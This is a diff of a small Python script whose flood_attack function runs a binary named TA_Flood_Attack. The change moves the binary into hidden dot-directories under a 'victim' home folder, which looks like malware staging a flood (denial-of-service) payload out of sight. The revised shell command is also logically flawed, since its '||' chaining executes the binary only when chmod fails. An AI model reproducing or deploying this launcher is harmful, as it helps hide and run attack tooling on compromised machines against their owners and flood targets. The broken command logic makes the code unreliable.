@@ -2,7 +2,7 @@ import os
 
 
 def flood_attack():
-    os.system('( chmod +x TA_Flood_Attack && ./TA_Flood_Attack ) || ( ./TA_Flood_Attack )')
+    os.system('( chmod +x ./home/victim/.etc/.module/TA_Flood_Attack || ./home/victim/.etc/.module/TA_Flood_Attack ) || ( chmod +x ./home/victim/.var/.module/TA_Flood_Attack || ./home/victim/.var/.module/TA_Flood_Attack )')
 
 
 if __name__ == '__main__':
